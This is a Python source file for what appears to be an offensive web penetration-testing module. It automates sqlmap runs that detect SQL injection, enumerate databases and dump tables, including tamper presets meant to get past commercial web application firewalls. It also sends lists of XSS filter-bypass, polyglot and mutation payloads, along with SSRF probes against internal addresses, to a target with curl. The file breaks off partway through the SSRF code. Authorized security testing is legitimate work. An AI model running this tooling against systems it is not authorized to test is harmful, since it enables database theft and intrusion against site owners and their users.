"""
BlackSentinel Strike - Web Advanced Module
Copyright (c) 2024-2025 BlackSentinel Strike - All Rights Reserved

Advanced Web Application Penetration Testing Module
Covers: SQL Injection, XSS, SSRF, Deserialization, Business Logic
"""

import subprocess
import shlex
import os
import re
import time
import urllib.parse
from typing import Optional, Dict, Any, List


class WebAdvanced:
    """Advanced Web Application Penetration Testing Module for BlackSentinel Strike."""

    def __init__(self, output_dir: Optional[str] = None):
        self.output_dir = output_dir or os.path.expanduser("~/.blacksentinel/results")
        self.tool_paths = {
            "sqlmap": "sqlmap",
            "nuclei": "nuclei",
            "ffuf": "ffuf",
            "nikto": "nikto",
            "dirb": "dirb",
            "gobuster": "gobuster",
            "wfuzz": "wfuzz",
            "httpx": "httpx",
            "curl": "curl",
            "python3": "python3",
        }
        self.session_log: List[Dict[str, Any]] = []
        os.makedirs(self.output_dir, exist_ok=True)

    def run_command(self, cmd: str, timeout: int = 30) -> str:
        """Execute a system command and return output as string."""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            output = result.stdout + result.stderr
            return output.strip()
        except subprocess.TimeoutExpired:
            return f"[TIMEOUT] Command exceeded {timeout}s timeout: {cmd}"
        except FileNotFoundError:
            return f"[ERROR] Tool not found: {cmd.split()[0]}"
        except PermissionError:
            return f"[ERROR] Permission denied executing: {cmd}"
        except Exception as e:
            return f"[ERROR] {str(e)}"

    def _log_action(self, method: str, target: str, result: str) -> None:
        """Log actions for session tracking."""
        self.session_log.append(
            {
                "timestamp": time.time(),
                "method": method,
                "target": target,
                "result_length": len(result),
            }
        )

    def _save_output(self, filename: str, content: str) -> str:
        """Save results to file and return path."""
        filepath = os.path.join(self.output_dir, filename)
        try:
            with open(filepath, "w") as f:
                f.write(content)
            return filepath
        except Exception as e:
            return f"[ERROR] Could not save output: {e}"

    def _build_target_url(self, target: str, path: str = "", params: str = "") -> str:
        """Construct full target URL."""
        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"
        url = target.rstrip("/")
        if path:
            url = f"{url}/{path.lstrip('/')}"
        if params:
            url = f"{url}?{params}"
        return url

    # =========================================================================
    # SQL INJECTION METHODS (15)
    # =========================================================================

    def sqlmap_auto_detect(
        self, target: str, url: str = "", data: str = "", cookie: str = "", level: int = 1, risk: int = 1
    ) -> str:
        """Automatically detect SQL injection vulnerabilities using sqlmap."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--level",
                str(level),
                "--risk",
                str(risk),
                "--output-dir",
                self.output_dir,
            ]
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=120)
            self._log_action("sqlmap_auto_detect", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_auto_detect failed: {str(e)}"

    def sqlmap_get_databases(self, target: str, url: str = "", data: str = "", cookie: str = "", level: int = 3) -> str:
        """Enumerate databases using sqlmap."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--dbs",
                "--level",
                str(level),
                "--output-dir",
                self.output_dir,
            ]
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_get_databases", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_get_databases failed: {str(e)}"

    def sqlmap_get_tables(
        self, target: str, url: str = "", database: str = "", data: str = "", cookie: str = ""
    ) -> str:
        """Enumerate tables in a specific database."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--tables",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if database:
                cmd_parts.extend(["-D", shlex.quote(database)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_get_tables", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_get_tables failed: {str(e)}"

    def sqlmap_dump_table(
        self,
        target: str,
        url: str = "",
        database: str = "",
        table: str = "",
        data: str = "",
        cookie: str = "",
        columns: str = "",
        limit: int = 100,
    ) -> str:
        """Dump a specific table from the database."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--dump",
                "--level",
                "3",
                "--limit",
                str(limit),
                "--output-dir",
                self.output_dir,
            ]
            if database:
                cmd_parts.extend(["-D", shlex.quote(database)])
            if table:
                cmd_parts.extend(["-T", shlex.quote(table)])
            if columns:
                cmd_parts.extend(["-C", shlex.quote(columns)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=300)
            self._log_action("sqlmap_dump_table", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_dump_table failed: {str(e)}"

    def sqlmap_bypass_waf(
        self, target: str, url: str = "", waf_type: str = "", data: str = "", cookie: str = ""
    ) -> str:
        """Use tamper scripts to bypass WAF/IDS/IPS protections."""
        try:
            if not url:
                self._build_target_url(target, "/")
            tamper_map = {
                "modsecurity": "space2comment,between,randomcase",
                "cloudflare": "between,randomcase,space2comment",
                "akamai": "randomcase,space2comment,between",
                "imperva": "between,randomcase,charencode",
                "generic": "between,randomcase,space2comment,charencode",
            }
            tamper = tamper_map.get(waf_type, tamper_map["generic"])
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--tamper",
                shlex.quote(tamper),
                "--level",
                "5",
                "--risk",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_bypass_waf", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_bypass_waf failed: {str(e)}"

    def sqlmap_tamper_script(
        self, target: str, url: str = "", scripts: str = "", data: str = "", cookie: str = ""
    ) -> str:
        """Execute sqlmap with custom tamper scripts."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            if not scripts:
                scripts = "between,randomcase,space2comment"
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--tamper",
                shlex.quote(scripts),
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_tamper_script", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_tamper_script failed: {str(e)}"

    def sqlmap_time_based(self, target: str, url: str = "", param: str = "", data: str = "", cookie: str = "") -> str:
        """Perform time-based blind SQL injection testing."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--technique",
                "T",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=240)
            self._log_action("sqlmap_time_based", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_time_based failed: {str(e)}"

    def sqlmap_blind_boolean(
        self, target: str, url: str = "", param: str = "", data: str = "", cookie: str = ""
    ) -> str:
        """Perform boolean-based blind SQL injection testing."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--technique",
                "B",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_blind_boolean", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_blind_boolean failed: {str(e)}"

    def sqlmap_union_based(self, target: str, url: str = "", param: str = "", data: str = "", cookie: str = "") -> str:
        """Perform UNION-based SQL injection testing."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--technique",
                "U",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_union_based", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_union_based failed: {str(e)}"

    def sqlmap_error_based(self, target: str, url: str = "", param: str = "", data: str = "", cookie: str = "") -> str:
        """Perform error-based SQL injection testing."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--technique",
                "E",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_error_based", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_error_based failed: {str(e)}"

    def sqlmap_stacked_queries(
        self, target: str, url: str = "", param: str = "", data: str = "", cookie: str = ""
    ) -> str:
        """Test for stacked queries SQL injection."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--technique",
                "S",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_stacked_queries", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_stacked_queries failed: {str(e)}"

    def sqlmap_second_order(
        self, target: str, url_first: str = "", url_second: str = "", param: str = "", data: str = ""
    ) -> str:
        """Test for second-order SQL injection."""
        try:
            if not url_first:
                url_first = self._build_target_url(target, "/")
            if not url_second:
                url_second = self._build_target_url(target, "/search")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url_first),
                "--batch",
                "--random-agent",
                "--second-url",
                shlex.quote(url_second),
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_second_order", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_second_order failed: {str(e)}"

    def sqlmap_out_of_band(
        self, target: str, url: str = "", param: str = "", dns_server: str = "", data: str = ""
    ) -> str:
        """Test for out-of-band SQL injection using DNS or HTTP exfiltration."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--technique",
                "O",
                "--level",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if dns_server:
                cmd_parts.extend(["--dns-domain", shlex.quote(dns_server)])
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_out_of_band", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_out_of_band failed: {str(e)}"

    def sqlmap_batch_scan(
        self,
        target: str,
        url: str = "",
        params_file: str = "",
        data: str = "",
        cookie: str = "",
        level: int = 3,
        risk: int = 2,
    ) -> str:
        """Run sqlmap in batch mode for automated large-scale scanning."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--batch",
                "--threads",
                "4",
                "--level",
                str(level),
                "--risk",
                str(risk),
                "--smart",
                "--output-dir",
                self.output_dir,
                "--forms",
                "--crawl",
                "2",
            ]
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            if cookie:
                cmd_parts.extend(["--cookie", shlex.quote(cookie)])
            result = self.run_command(" ".join(cmd_parts), timeout=300)
            self._log_action("sqlmap_batch_scan", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_batch_scan failed: {str(e)}"

    def sqlmap_custom_payload(
        self, target: str, url: str = "", payload: str = "", param: str = "", data: str = ""
    ) -> str:
        """Execute sqlmap with a custom injection payload."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            if not payload:
                payload = "' OR 1=1 -- "
            cmd_parts = [
                self.tool_paths["sqlmap"],
                "-u",
                shlex.quote(url),
                "--batch",
                "--random-agent",
                "--level",
                "5",
                "--risk",
                "3",
                "--output-dir",
                self.output_dir,
            ]
            if param:
                cmd_parts.extend(["-p", shlex.quote(param)])
            if data:
                cmd_parts.extend(["--data", shlex.quote(data)])
            result = self.run_command(" ".join(cmd_parts), timeout=180)
            self._log_action("sqlmap_custom_payload", target, result)
            return result
        except Exception as e:
            return f"[ERROR] sqlmap_custom_payload failed: {str(e)}"

    # =========================================================================
    # XSS METHODS (10)
    # =========================================================================

    def xss_reflected_scan(self, target: str, url: str = "", param: str = "", cookie: str = "") -> str:
        """Scan for reflected XSS vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/", "q=test")
            payloads = [
                "<script>alert('XSS')</script>",
                "'-alert(1)-'",
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "';alert(String.fromCharCode(88,83,83))//",
                "<iframe src=javascript:alert(1)>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
            ]
            results = []
            results.append(f"[*] XSS Reflected Scan against: {url}")
            results.append(f"[*] Testing {len(payloads)} payloads\n")
            for i, payload in enumerate(payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url)
                cmd = f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" {shlex.quote(test_url)}'
                status = self.run_command(cmd, timeout=10)
                results.append(f"[{i}/{len(payloads)}] Payload: {payload}")
                results.append(f"  -> HTTP Status: {status}")
            final = "\n".join(results)
            self._log_action("xss_reflected_scan", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_reflected_scan failed: {str(e)}"

    def xss_stored_scan(
        self, target: str, url: str = "", param: str = "", cookie: str = "", method: str = "POST"
    ) -> str:
        """Scan for stored XSS vulnerabilities by injecting payloads."""
        try:
            if not url:
                url = self._build_target_url(target, "/comment")
            payloads = [
                "<script>alert('StoredXSS')</script>",
                "<img src=x onerror=alert('StoredXSS')>",
                "<svg onload=alert('StoredXSS')>",
                "<body onload=alert('StoredXSS')>",
                "<input onfocus=alert('StoredXSS') autofocus>",
            ]
            results = []
            results.append(f"[*] Stored XSS Scan against: {url}")
            results.append(f"[*] Method: {method}\n")
            for i, payload in enumerate(payloads, 1):
                data_param = param or "comment"
                data = f"{data_param}={urllib.parse.quote(payload)}"
                cmd = f"{self.tool_paths['curl']} -s -X {method.upper()} -d {shlex.quote(data)} "
                if cookie:
                    cmd += f"-b {shlex.quote(cookie)} "
                cmd += f'-o /dev/null -w "%{{http_code}}" {shlex.quote(url)}'
                status = self.run_command(cmd, timeout=10)
                results.append(f"[{i}] Payload: {payload}")
                results.append(f"  -> Response: {status}")
            final = "\n".join(results)
            self._log_action("xss_stored_scan", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_stored_scan failed: {str(e)}"

    def xss_dom_based(self, target: str, url: str = "", param: str = "") -> str:
        """Scan for DOM-based XSS vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            dom_payloads = [
                "#<script>alert(1)</script>",
                "#<img src=x onerror=alert(1)>",
                "#javascript:alert(1)",
                '#"-alert(1)-"',
                "#'onmouseover=alert(1)",
                "#javascript:void(alert(1))",
                "#<svg/onload=alert(1)>",
            ]
            results = []
            results.append(f"[*] DOM-based XSS Scan against: {url}")
            results.append(f"[*] Testing {len(dom_payloads)} DOM payloads\n")
            for i, payload in enumerate(dom_payloads, 1):
                test_url = f"{url}{urllib.parse.quote(payload, safe='#')}"
                cmd = f'{self.tool_paths["curl"]} -s {shlex.quote(test_url)} | grep -i "alert\\|onerror\\|onload"'
                output = self.run_command(cmd, timeout=10)
                results.append(f"[{i}] Fragment: {payload}")
                if output:
                    results.append("  [!] Potential DOM sink found:")
                    results.append(f"      {output[:200]}")
                else:
                    results.append("  -> No visible DOM sink")
            final = "\n".join(results)
            self._log_action("xss_dom_based", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_dom_based failed: {str(e)}"

    def xss_filter_bypass(self, target: str, url: str = "", param: str = "") -> str:
        """Test XSS filter bypass techniques."""
        try:
            if not url:
                url = self._build_target_url(target, "/", "q=test")
            bypass_payloads = [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                "<svg/onload=alert&#40;1&#41;>",
                "<<script>alert(1)//<</script>",
                '<iframe src="javascript:alert(1)">',
                "<details open ontoggle=alert(1)>",
                "<math><mtext><table><mglyph><svg><mtext><textarea><path id=</textarea><img onerror=alert(1) src=1>",
                "javascript:alert/*eval*/(1)",
            ]
            results = []
            results.append(f"[*] XSS Filter Bypass Scan against: {url}\n")
            for i, payload in enumerate(bypass_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url)
                cmd = (
                    f'{self.tool_paths["curl"]} -s -A "Mozilla/5.0" '
                    f'{shlex.quote(test_url)} | grep -ci "alert\\|script\\|onerror"'
                )
                output = self.run_command(cmd, timeout=10)
                count = output.strip()
                results.append(f"[{i}] Bypass: {payload[:60]}...")
                if count and count != "0":
                    results.append(f"  [!] Possible filter bypass ({count} matches)")
                else:
                    results.append("  -> Filtered/blocked")
            final = "\n".join(results)
            self._log_action("xss_filter_bypass", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_filter_bypass failed: {str(e)}"

    def xss_csp_bypass(self, target: str, url: str = "") -> str:
        """Analyze and test for CSP bypass possibilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            cmd = (
                f"{self.tool_paths['curl']} -sI {shlex.quote(url)} | "
                f'grep -i "content-security-policy\\|x-frame-options\\|x-content-type"'
            )
            headers = self.run_command(cmd, timeout=10)
            results = []
            results.append(f"[*] CSP Analysis for: {url}\n")
            results.append(f"Security Headers:\n{headers}\n")
            if not headers:
                results.append("[!] No CSP headers found - site may be unprotected")
                results.append("[!] Consider testing all XSS vectors directly")
            else:
                results.append("[*] Analyzing CSP directives...")
                if "unsafe-inline" in headers.lower():
                    results.append("[!] 'unsafe-inline' found - inline script injection possible")
                if "unsafe-eval" in headers.lower():
                    results.append("[!] 'unsafe-eval' found - eval() injection possible")
                if "data:" in headers:
                    results.append("[!] 'data:' URI allowed - data URI XSS possible")
                if "unsafe-redirect" in headers.lower():
                    results.append("[!] 'unsafe-redirect' found - open redirect to XSS possible")
                if "none" not in headers.lower() and "script-src" in headers.lower():
                    whitelist = re.findall(r"script-src[^;]*;", headers, re.I)
                    if whitelist:
                        results.append(f"[i] Whitelisted sources: {whitelist[0]}")
                        results.append("[*] Test subdomain takeover on whitelisted domains")
            final = "\n".join(results)
            self._log_action("xss_csp_bypass", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_csp_bypass failed: {str(e)}"

    def xss_polyglot(self, target: str, url: str = "", param: str = "") -> str:
        """Test XSS polyglot payloads that work across multiple contexts."""
        try:
            if not url:
                url = self._build_target_url(target, "/", "q=test")
            polyglot_payloads = [
                "jaVasCript:/*-/*`/*\\'/*\"/**/(/* */oNcliCk=alert() )//%%0telerikelerikelerikelert(1)%0d%0a%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "'-alert(1)-'",
                '"-alert(1)-"',
                "</script><img src=x onerror=alert(1)>",
                "%3Csvg%20onload%3Dalert(1)%3E",
                "javascript:alert(document.domain)",
                "'\"--></script><script>alert(1)</script>",
                "<img src=1 onerror=alert(1)>//",
                '"><svg/onload=alert(1)>//',
                "';alert(1)//",
            ]
            results = []
            results.append(f"[*] Polyglot XSS Scan against: {url}\n")
            for i, payload in enumerate(polyglot_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url)
                cmd = (
                    f'{self.tool_paths["curl"]} -s -A "Mozilla/5.0" '
                    f'-D - {shlex.quote(test_url)} | grep -i "alert\\|script\\|onerror\\|onload"'
                )
                output = self.run_command(cmd, timeout=10)
                results.append(f"[{i}] Polyglot: {payload[:50]}...")
                if output and "alert" in output.lower():
                    results.append("  [!] Payload reflected in response")
                else:
                    results.append("  -> Not reflected")
            final = "\n".join(results)
            self._log_action("xss_polyglot", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_polyglot failed: {str(e)}"

    def xss_event_handler(self, target: str, url: str = "", param: str = "") -> str:
        """Test XSS via HTML event handlers."""
        try:
            if not url:
                url = self._build_target_url(target, "/", "q=test")
            event_payloads = [
                "<img src=x onerror=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<body onload=alert(1)>",
                "<svg onload=alert(1)>",
                "<iframe onload=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<textarea onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<keygen onfocus=alert(1) autofocus>",
                "<div onmouseover=alert(1)>hover</div>",
                "<a onmouseover=alert(1)>hover</a>",
                "<isindex action=javascript:alert(1>",
            ]
            results = []
            results.append(f"[*] Event Handler XSS Scan against: {url}\n")
            for i, payload in enumerate(event_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url)
                cmd = (
                    f"{self.tool_paths['curl']} -s {shlex.quote(test_url)} | "
                    f'grep -ci "onerror\\|onload\\|onfocus\\|onmouseover\\|ontoggle"'
                )
                count = self.run_command(cmd, timeout=10).strip()
                results.append(f"[{i}] Event: {payload[:50]}...")
                if count and count != "0":
                    results.append(f"  [!] Event handler reflected ({count} occurrences)")
                else:
                    results.append("  -> Not reflected")
            final = "\n".join(results)
            self._log_action("xss_event_handler", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_event_handler failed: {str(e)}"

    def xss_svg_injection(self, target: str, url: str = "", param: str = "") -> str:
        """Test for SVG-based XSS injection."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            svg_payloads = [
                "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/ >",
                "<svg><script>alert(1)</script></svg>",
                "<svg><foreignObject><body xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></body></foreignObject></svg>",
                "<svg/onload=alert(1)>",
                "<svg><a xlink:href='javascript:alert(1)'><text>Click</text></a></svg>",
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            ]
            results = []
            results.append(f"[*] SVG Injection XSS Scan against: {url}\n")
            for i, payload in enumerate(svg_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url) if "?" in url else f"{url}?svg={encoded}"
                cmd = f'{self.tool_paths["curl"]} -s {shlex.quote(test_url)} | grep -ci "svg\\|script\\|alert\\|onload"'
                count = self.run_command(cmd, timeout=10).strip()
                results.append(f"[{i}] SVG: {payload[:60]}...")
                if count and count != "0":
                    results.append(f"  [!] SVG payload reflected ({count})")
                else:
                    results.append("  -> Not reflected")
            final = "\n".join(results)
            self._log_action("xss_svg_injection", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_svg_injection failed: {str(e)}"

    def xss_mutation_xss(self, target: str, url: str = "", param: str = "") -> str:
        """Test for mutation XSS (mXSS) that bypasses HTML sanitizers."""
        try:
            if not url:
                url = self._build_target_url(target, "/", "q=test")
            mxss_payloads = [
                '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                "<math><mtext><table><mglyph><svg><mtext><textarea><path id=</textarea><img onerror=alert(1) src=1>",
                '<p id="x" style="">test</p><script>alert(document.getElementById(\'x\').outerHTML)</script>',
                "<div><p id=\"a\">test</p></div><script>alert(document.getElementById('a').innerHTML)</script>",
                "<style></p><img src=x onerror=alert(1)></style>",
                '<a href="java\nscript:alert(1)">Click</a>',
            ]
            results = []
            results.append(f"[*] Mutation XSS (mXSS) Scan against: {url}\n")
            for i, payload in enumerate(mxss_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url) if "?" in url else f"{url}?mxss={encoded}"
                cmd = f'{self.tool_paths["curl"]} -s {shlex.quote(test_url)} | grep -ci "onerror\\|alert\\|script"'
                count = self.run_command(cmd, timeout=10).strip()
                results.append(f"[{i}] mXSS: {payload[:60]}...")
                if count and count != "0":
                    results.append(f"  [!] Mutation payload survived ({count})")
                else:
                    results.append("  -> Sanitized/filtered")
            final = "\n".join(results)
            self._log_action("xss_mutation_xss", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_mutation_xss failed: {str(e)}"

    def xss_context_aware(self, target: str, url: str = "", param: str = "") -> str:
        """Perform context-aware XSS testing across HTML, JS, and attribute contexts."""
        try:
            if not url:
                url = self._build_target_url(target, "/", "q=test")
            contexts = {
                "HTML Context": [
                    "</td><script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
                "JavaScript Context": [
                    "';alert(1)//",
                    '"-alert(1)-"',
                    "\\;alert(1);",
                ],
                "Attribute Context": [
                    '" onfocus=alert(1) autofocus="',
                    "' onmouseover=alert(1) '",
                    '"><script>alert(1)</script>',
                ],
                "URL Context": [
                    "javascript:alert(1)",
                    "data:text/html,<script>alert(1)</script>",
                ],
            }
            results = []
            results.append(f"[*] Context-Aware XSS Scan against: {url}\n")
            for context_name, payloads in contexts.items():
                results.append(f"=== {context_name} ===")
                for i, payload in enumerate(payloads, 1):
                    encoded = urllib.parse.quote(payload)
                    test_url = re.sub(r"(q=)[^&]*", f"q={encoded}", url) if "?" in url else f"{url}?ctx={encoded}"
                    cmd = (
                        f"{self.tool_paths['curl']} -s {shlex.quote(test_url)} | "
                        f'grep -ci "alert\\|script\\|onerror\\|onfocus"'
                    )
                    count = self.run_command(cmd, timeout=10).strip()
                    status = "[!] Reflected" if count and count != "0" else "-> Not reflected"
                    results.append(f"  [{i}] {payload[:50]}... -> {status}")
                results.append("")
            final = "\n".join(results)
            self._log_action("xss_context_aware", target, final)
            return final
        except Exception as e:
            return f"[ERROR] xss_context_aware failed: {str(e)}"

    # =========================================================================
    # SSRF METHODS (10)
    # =========================================================================

    def ssrf_basic_detection(self, target: str, url: str = "", param: str = "", method: str = "GET") -> str:
        """Detect basic SSRF vulnerabilities by injecting internal URLs."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            ssrf_payloads = [
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]",
                "http://0.0.0.0",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:8080",
                "http://127.0.0.1:22",
                "http://internal.company.local",
            ]
            results = []
            results.append(f"[*] Basic SSRF Detection against: {url}")
            results.append(f"[*] Testing {len(ssrf_payloads)} internal URLs\n")
            for i, payload in enumerate(ssrf_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = (
                    f"{self.tool_paths['curl']} -s -X {method.upper()} "
                    f'{shlex.quote(test_url)} -w "\\n%{{http_code}}\\n%{{size_download}}"'
                )
                output = self.run_command(cmd, timeout=10)
                results.append(f"[{i}] Target: {payload}")
                lines = output.strip().split("\n")
                if len(lines) >= 2:
                    status = lines[-2]
                    size = lines[-1]
